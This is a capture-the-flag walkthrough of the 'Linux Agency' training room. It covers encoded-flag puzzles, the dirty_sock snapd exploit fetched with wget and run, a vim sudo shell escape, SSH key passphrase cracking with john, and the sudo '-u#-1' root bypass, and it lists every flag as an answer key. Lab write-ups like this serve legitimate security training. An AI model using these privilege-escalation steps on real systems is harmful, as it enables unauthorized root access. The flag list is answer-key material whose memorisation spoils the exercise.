## # Linux Agency
```Description
This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.
```
---
## Machine Info 
```Info
Please wait about 1 minute before SSH'ing into the box.
IP : `10.49.144.102`
SSH Username : `agent47`
SSH Password : `640509040147`

Each flag found will serve as the password for the next user. The flag includes the username of the next user that is part of this challenge. The Flag format is : `username{md5sum}`

The order of users: agent47 --> mission1 --> mission30 will be part of Task 3: Linux Fundamentals.

After those missions, the next levels will be in Task 4: Privilege Escalation.

Agent 47, we are ICA, the Linux Agency. We will test your Linux Fundamentals. Let's see if you can pass all these challenges of basic Linux. The password of the next mission will be the flag of that mission. Example: `mission1{1234567890}` will be the password for the mission1 user.  

**Mission Active**
```
---
## Login 
```bash
 ssh agent47@10.49.144.102
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
agent47@10.49.144.102's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
agent47@linuxagency:~$
```
## Stage 0 — Initial Access & Root (dirty_sock / CVE-2019-7304)
```bash
ssh agent47@10.49.144.102
# password: 640509040147
```
- First flag is printed directly on login:
```
mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
```
- Enumerated for privilege escalation vectors:
```bash
wget http://192.168.178.7:8000/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```
Output flagged several CVEs as "probable" for Ubuntu 18.04 / kernel 4.15.0, including:
- CVE-2021-4034 (PwnKit)
- CVE-2021-3493 (OverlayFS)
- CVE-2021-3156 (sudo Baron Samedit)
- **CVE-2019-7304 (dirty_sock)** ← used

```bash
wget http://192.168.178.7:8000/dirty_sockv2.py
python3 dirty_sockv2.py
```
- This abuses snapd's local Unix socket API (improper access control on `/run/snapd.socket` reachable without auth under certain snapd versions) to install a malicious "trojan" snap that creates a backdoor user with full sudo rights.

```
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
```
- Exploit
```bash
su dirty_sock
# password: dirty_sock
sudo -l
# (ALL : ALL) ALL
sudo su
```
Now **root** on the host for the remainder of the room. All subsequent mission folders were enumerated with:
```bash
find / -type f -user missionN 2>/dev/null
```

and flags collected either via `cat`, directly reading protected `flag.txt` files (root bypasses the `-r--------` permission bits), or by decoding obfuscated content.

---
## Task 3 — Linux Fundamentals (mission1 → mission30)

### Mission1 → mission10 — plain `flag.txt`
Most of these were a straightforward `cat flag.txt` once `cd`'d into `/home/missionN` as root. A couple of notes:
- **mission9**: the flag.txt was actually planted at filesystem root — `cat /flag.txt`.
- **mission2**: the flag string itself was the _filename_ inside the directory (`ls` revealed it directly).

```
mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
mission2{8a1b68bb11e4a35245061656b5b9fa0d}
mission3{ab1e1ae5cba688340825103f70b0f976}
mission4{264a7eeb920f80b3ee9665fafb7ff92d}
mission5{bc67906710c3a376bcc7bd25978f62c0}
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
mission7{53fd6b2bad6e85519c7403267225def5}
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
mission9{ba1069363d182e1c114bef7521c898f5}
mission10{0c9d1c7c5683a1a29b05bb67856524b6}
```

### Mission11 — base64 + reverse, hidden in `.bashrc`
`mission11`'s `.bashrc` contained:
```bash
export FLAG=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= | base64 -d | rev)
```
Decode:
```bash
echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= | base64 -d | rev
```
- Flag
```
mission12{f449a1d33d6edc327354635967f9a720}
```
This is the password for `mission12`, _not_ mission11's own flag (mission11's own flag was found separately during enumeration). This "base64 + rev" pattern repeats several times through the mission chain.

### Mission13 — base64 in `flag.txt`
```bash
cat flag.txt
# bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
echo bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo= | base64 -d
```
- Flag
```
mission14{d598de95639514b9941507617b9e54d2}
```

### Mission14 — raw binary string
```bash
cat flag.txt
# 01101101011010010111001101110011...
```
- Converted binary → ASCII (via CyberChef or `python3 -c "print(''.join(chr(int(b,2)) for b in open('flag.txt').read().split()))"` style grouping into bytes):
```
mission15{fc4915d818bfaeff01185c3547f25596}
```
### Mission15 — hex

```bash
cat flag.txt
# 6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
```
- Encrypted Hash
```bash
echo 6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D | xxd -r -p
```
- Flag
```
mission16{884417d40033c4c2091b44d7c26a908e}
```
### Mission16 — compiled C binary, Ghidra static analysis
- `mission16`'s folder held a `flag` ELF binary (sourced from a `flag.c`, per `strings`). Pulled it to a local VM and loaded into Ghidra. Decompiled `main()`:

```c
byte local_48[56] = { 0x67, 99, 0x79, 0x79, 99, 0x65, 100, ... };
sVar1 = strlen((char *)local_48);
for (local_50 = 0; local_50 < (int)sVar1; local_50++) {
    local_48[local_50] ^= 10;
    putchar(local_48[local_50]);
}
```
- Simple XOR-with-10 obfuscation. Decoded in Python:
```python
data = [0x67,99,0x79,0x79,99,0x65,100, ...]
print(''.join(chr(b ^ 10) for b in data))
```
- Flag
```
mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```
### Mission17 — Java source, XOR 13

```java
String encrypted_flag="`d~~dbc<5vk=4:;=;9445;o954nil>?=lo8k:4<:h5p";
outputString += (char)(encrypted_flag.charAt(i) ^ 13);
```
- Python Code
```python
s = '`d~~dbc<5vk=4:;=;9445;o954nil>?=lo8k:4<:h5p'
print(''.join(chr(ord(c) ^ 13) for c in s))
```
- Flag
```
mission18{f09760649986b489cda320ab5f7917e8}
```
### Mission18 — Ruby source, XOR `'Z'.ord` (90)
- Ruby Code
```ruby
encrypted = encryptDecrypt("73))354kc!;j8<nk<ol8i;9lhh>bjb<m;nibohon8m'")
# codepoints[i] ^ 'Z'.ord
```

- Note: the Ruby script defined a red-herring `key = ['K','C','Q']` array that was never actually used — the real XOR key was just `'Z'.ord` (90).

```python
s = "73))354kc!;j8<nk<ol8i;9lhh>bjb<m;nibohon8m'"
print(''.join(chr(ord(c) ^ ord('Z')) for c in s))
```
- Flag
```
mission19{a0bf41f56b3ac622d808f7a4385254b7}
```
### Mission19 — C source, XOR 10

```c
char flag[] = "gcyyced8:qh:>28l3o3:i2kn8>8;hl>9?9in2oko;iw";
flag[i] ^= 10;
```
- Flag
```
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
```
### Mission20 — Python script, XOR `'S'`

```python
flag = ">:  :<=ab(d76dfe2210fak1gge5e61`kgbj`bk5c0."
for i in range(len(flag)):
    flag = flag[:i] + chr(ord(flag[i]) ^ ord("S")) + flag[i+1:]
    print(flag[i], end="")
```
- Ran directly on target:
```bash
python3 flag.py
```
- FLag
```
mission21{7de756aabc528b446f6eb38419318f0c}
```
### Mission21 — base64 + reverse (CyberChef), via `.bashrc`

Same pattern as mission11, found inline in `.bashrc`:
```bash
echo fWZhYTk0ZDI0YjQ4OTZlMmE2ZGU5ODgwYmU0N2FhYzQyezIybm9pc3NpbQo= | base64 -d | rev
```
- Flag
```
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```
### Mission23 — hint-driven: local web server + curl
- `mission23`'s home held a protected `message.txt` (`-r--------`):
```
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
```
Decoded hints: "hosts" → check local web service; "curly hairs" → **curl**.
```bash
curl http://127.0.0.1:80/
```
The default Apache page's `<title>` tag held the flag directly:
```html
<title>mission24{dbaeb06591a7fd6230407df3a947b89c}</title>
```
### Mission24 — `bribe` ELF binary, env-var gated, Ghidra + XOR\
Running the binary cold:
```bash
./bribe
# "Give Me money Man!!!"
```
- Pulled to local VM, Ghidra decompile of `main()`:
```c
pcVar1 = getenv("pocket");
local_68 = (pcVar1 != NULL) ? strncmp(pcVar1, "money", 5) : 9999;
if (local_68 == 0) {
    // prints XOR-0x43 obfuscated flag, byte array local_48[]
} else {
    pcVar1 = getenv("init");
    if (pcVar1 == NULL) system("export init=abc");  // red herring, subshell-scoped
    puts("Words are not the price for your flag");
}
```
- Exploit:
```bash
export pocket=money
./bribe
```
- Flag bytes decoded with XOR `0x43`:
```python
data = [0x2e,0x2a,0x30,0x30,0x2a,0x2c,0x2d,0x71, ...]
print(''.join(chr(b ^ 0x43) for b in data))
```
- Flag
```
mission25{61b93637881c87c71f220033b22a921b}
```
### Mission27 — polyglot "onion" file (fake extension chain)

Filename:
```
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
```
The extension chain is a red herring — `file` reads magic bytes, not names:
```bash
mv flag....gz flag.gz
file flag.gz
# gzip compressed data
gunzip flag.gz
file flag
# GIF image data (also a red herring — not a valid image)
strings flag
```
- `strings` pulled the flag straight out of the "GIF" payload:
```
mission28{03556f8ca983ef4dc26d2055aef9770f}
```
**Lesson**: always trust `file`'s magic-byte detection over any extension in the filename; peel one real layer at a time.
### Mission28 — reversed text (CyberChef reverse)
- `txt.galf` (filename itself reversed — a hint):

```bash
cat txt.galf
# }1fff2ad47eb52e68523621b8d50b2918{92noissim
```
- Reverse the string:
```
mission29{8192b05d8b12632586e25be74da2fff1}
```
### Mission29 → mission30
`mission30` is the final mission of Task 3; its flag is the password for `viktor`, the first user of Task 4.
```
mission30{d25b4c9fac38411d2fcb4796171bda6e}
```
---
## Task 4 — Privilege Escalation (Named Users)

Chain order: **viktor → dalia → silvio → reza → jordan → ken → sean → penelope → maya**. Each user's flag is the next user's login password. Being root for this whole phase let most flags be read/decoded directly; `sean` required real investigative work (detailed below).

```
viktor{b52c60124c0f8f85fe647021122b3d9a}
dalia{4a94a7a7bb4a819a63a33979926c77dc}
silvio{657b4d058c03ab9988875bc937f9c2ef}
reza{2f1901644eda75306f3142d837b80d3e}
```
### jordan — reversed `flag.txt`

```bash
cat flag.txt
# }3c3e9f8796493b98285b9c13c3b4cbcf{nadroj
```
- Reverse:
```
jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
```
- Flag
```
ken{4115bf456d1aaf012ed4550c418ba99f}
```
### Sean — the hard one (no file, no hash, no sudo-of-his-own)

- Enumeration found **nothing** in `/home/sean` beyond stock dotfiles:
```bash
find /home/sean -type f -exec file {} \;
find / -user sean -type f 2>/dev/null
find / -group sean -type f 2>/dev/null
getfattr -d -R /home/sean 2>/dev/null   # no xattrs either
grep sean /etc/shadow                   # no crackable hash — account not meant for direct login
```
- The only real lead was in `/etc/sudoers`:
```
ken     ALL=(sean)      NOPASSWD:/usr/bin/vim
```
- A **GTFOBins `vim` privilege escalation**: `ken` can run `vim` as `sean` with no password, and `vim` can break out to a shell:
```bash
su ken
sudo -u sean vim -c ':!/bin/bash'
# or inside vim: :!/bin/bash
```

- (A hint later confirmed this vector directly: _"Maybe you need a green Indian dish wash Bar?"_ — **Vim** is a well-known Indian dishwashing bar-soap brand, confirming the `vim` binary was the intended tool.)

- Even with a genuine shell as `sean` (`whoami` → `sean`), there was still no flag file, no sudo rights of his own (`sudo -l` just prompted for an unknown password), and nothing in `/etc/profile.d/`.

- The breakthrough: `id sean` showed `groups=1037(sean),4(adm)` — membership in the **`adm`** group, which grants read access to system logs normally restricted to root. That pointed straight at `/var/log/`:
```bash
grep -rE "[a-zA-Z0-9_]+\{[a-f0-9]{32}\}" /var/log/ 2>/dev/null
```
- Found in `/var/log/syslog.bak`, disguised as a fake kernel ACPI line:
```
Jan 12 02:58:58 ubuntu kernel: [0.000000] ACPI: LAPIC_NMI (...) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
```
- Flag
```
sean{4c5685f4db7966a43cf8e95859801281}
```
- A bonus base64 string tagged onto the same log line decoded to a hint for the next user:
```bash
echo VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg== | base64 -d
# "The password of penelope is p3nelope"
```
- Flag
```
penelope{2da1c2e9d2bd0004556ae9e107c1d222}
```
### maya — final named-user flag, plus the pivot note

```bash
cat /home/maya/flag.txt
```
- Flag
```
maya{a66e159374b98f64f89f7c8d458ebb2b}
```
- maya's home also held `elusive_targets.txt` — the pivot into the final target:

```
Welcome 47, glad you made this far. ... we have a last unfinished job
which is to infiltrate kronstadt industries. He has an entrypoint at localhost.

Previously, another agent tried to infiltrate kronstadt industries nearly
3 years back, but we failed. Robert is involved in illegally hacking into
our servers. He was able to transfer the .ssh folder from robert's home
directory. The old .ssh is kept inside old_robert_ssh directory in case
you need it.
```

---
## Final Stage — Kronstadt Industries (CVE-2019-14287)

### 1. Crack Robert's SSH key passphrase

```bash
cd /home/maya/old_robert_ssh
ssh2john id_rsa > robert_hash.txt
john robert_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show robert_hash.txt
```
- Flag
```
industryweapon   (id_rsa)
```
### 2. Find the real entry point
The main host's SSH (port 22) is unrelated — "entrypoint at localhost" meant a separate service. `ss -tunlp` revealed:

```
tcp  LISTEN  127.0.0.1:2222  docker-proxy
```

- A Docker container bound only to localhost:2222 — the Kronstadt Industries box.
### 3. Log in as robert

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 robert@localhost
```

- SSH fell back to interactive password auth (key auth didn't take cleanly in this session) — the cracked passphrase `industryweapon` was reused as robert's **login password** too (classic password reuse):

```
robert@localhost's password: industryweapon
Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
```
- robert's home contained a flavor-text file (not a flag):
```
robert.txt: "You shall not pass from here!!! I will not allow ICA to take over my world."
```
### 4. Enumerate — find the sudo misconfig

```bash
sudo -l
```
- Sudo Privileges
```
User robert may run the following commands on ec96850005d6:
    (ALL, !root) NOPASSWD: /bin/bash
```

This looks like it blocks running as root — but it's vulnerable to **CVE-2019-14287**, a sudo bug where specifying UID `-1` (interpreted as `4294967295`, which wraps to `0`) bypasses the `!root` exclusion list, since older sudo versions didn't canonicalize `-1` before checking the blocklist.

A hint delivered mid-challenge — `EVC[::-1]` — is literally `"CVE"` reversed, confirming this was the exact vulnerability class to look for.
### 5. Exploit

```bash
sudo -u#-1 /bin/bash
whoami    # root
id        # uid=0(root)
```
### 6. Capture user.txt
- Found via the Docker overlay2 filesystem, readable from the **host** (since the host user is already root):
```bash
find / -iname "user.txt" -o -iname "root.txt" 2>/dev/null
```
- Ouput
```
/root/root.txt
/var/lib/docker/overlay2/c9a6111dfa.../diff/root/user.txt
```
- Flag
```bash
cat /var/lib/docker/overlay2/c9a6111dfa.../diff/root/user.txt
```
- User Flag
```
user{620fb94d32470e1e9dcf8926481efc96}
```
### 7. Capture root.txt
Already root on the main host — straight `cat`:

```bash
cat /root/root.txt
```
- Flag
```
root{62ca2110ce7df377872dd9f0797f8476}
```

---
## Full Flag Summary

### Task 3 — Mission Flags

|Mission|Flag|
|---|---|
|1|`mission1{174dc8f191bcbb161fe25f8a5b58d1f0}`|
|2|`mission2{8a1b68bb11e4a35245061656b5b9fa0d}`|
|3|`mission3{ab1e1ae5cba688340825103f70b0f976}`|
|4|`mission4{264a7eeb920f80b3ee9665fafb7ff92d}`|
|5|`mission5{bc67906710c3a376bcc7bd25978f62c0}`|
|6|`mission6{1fa67e1adc244b5c6ea711f0c9675fde}`|
|7|`mission7{53fd6b2bad6e85519c7403267225def5}`|
|8|`mission8{3bee25ebda7fe7dc0a9d2f481d10577b}`|
|9|`mission9{ba1069363d182e1c114bef7521c898f5}`|
|10|`mission10{0c9d1c7c5683a1a29b05bb67856524b6}`|
|11|`mission11{db074d9b68f06246944b991d433180c0}`|
|12|`mission12{f449a1d33d6edc327354635967f9a720}`|
|13|`mission13{076124e360406b4c98ecefddd13ddb1f}`|
|14|`mission14{d598de95639514b9941507617b9e54d2}`|
|15|`mission15{fc4915d818bfaeff01185c3547f25596}`|
|16|`mission16{884417d40033c4c2091b44d7c26a908e}`|
|17|`mission17{49f8d1348a1053e221dfe7ff99f5cbf4}`|
|18|`mission18{f09760649986b489cda320ab5f7917e8}`|
|19|`mission19{a0bf41f56b3ac622d808f7a4385254b7}`|
|20|`mission20{b0482f9e90c8ad2421bf4353cd8eae1c}`|
|21|`mission21{7de756aabc528b446f6eb38419318f0c}`|
|22|`mission22{24caa74eb0889ed6a2e6984b42d49aaf}`|
|23|`mission23{3710b9cb185282e3f61d2fd8b1b4ffea}`|
|24|`mission24{dbaeb06591a7fd6230407df3a947b89c}`|
|25|`mission25{61b93637881c87c71f220033b22a921b}`|
|26|`mission26{cb6ce977c16c57f509e9f8462a120f00}`|
|27|`mission27{444d29b932124a48e7dddc0595788f4d}`|
|28|`mission28{03556f8ca983ef4dc26d2055aef9770f}`|
|29|`mission29{8192b05d8b12632586e25be74da2fff1}`|
|30|`mission30{d25b4c9fac38411d2fcb4796171bda6e}`|

### Task 4 — Named User Flags

|User|Flag|
|---|---|
|viktor|`viktor{b52c60124c0f8f85fe647021122b3d9a}`|
|dalia|`dalia{4a94a7a7bb4a819a63a33979926c77dc}`|
|silvio|`silvio{657b4d058c03ab9988875bc937f9c2ef}`|
|reza|`reza{2f1901644eda75306f3142d837b80d3e}`|
|jordan|`jordan{fcbc4b3c31c9b58289b3946978f9e3c3}`|
|ken|`ken{4115bf456d1aaf012ed4550c418ba99f}`|
|sean|`sean{4c5685f4db7966a43cf8e95859801281}`|
|penelope|`penelope{2da1c2e9d2bd0004556ae9e107c1d222}`|
|maya|`maya{a66e159374b98f64f89f7c8d458ebb2b}`|

### Final Targets

|Item|Value|
|---|---|
|Robert's SSH key passphrase|`industryweapon`|
|user.txt|`user{620fb94d32470e1e9dcf8926481efc96}`|
|root.txt|`root{62ca2110ce7df377872dd9f0797f8476}`|

---
## Techniques Used — Quick Reference

- **CVE-2019-7304** (dirty_sock) — snapd local socket privesc for initial root.
- **Caesar/XOR obfuscation** (keys 10, 13, 90, `'S'`, `0x43`) — recurring across C/Java/Ruby/Python flag generators.
- **Base64 + string reversal** — recurring "CyberChef-style" encoding pattern in `.bashrc` files and flag.txt contents.
- **Binary/hex encoding** — straightforward radix conversion.
- **Static binary analysis (Ghidra)** — decompiling stripped/obfuscated C binaries to recover XOR logic.
- **Environment-variable gated binary** (`bribe`) — `getenv()`/`strncmp()` gate, bypassed by setting the right env var.
- **Polyglot/"onion" files** — fake extension chains defeated by trusting `file`'s magic-byte detection, not filenames.
- **GTFOBins `vim` sudo escalation** — `ALL=(user) NOPASSWD: /usr/bin/vim` → `:!/bin/bash` breakout.
- **Hidden data in log files** — using the `adm` group's log-read access to find a flag disguised as a fake kernel log line.
- **SSH private key cracking** — `ssh2john` + `john` + rockyou.txt to recover a passphrase.
- **Password reuse** — the cracked key passphrase doubled as the account's login password.
- **CVE-2019-14287** (sudo `!root` bypass via `-u#-1`) — final privilege escalation inside the Kronstadt Docker container.
- **Docker overlay2 filesystem inspection** — reading a container's files directly from the host via `/var/lib/docker/overlay2/.../diff/`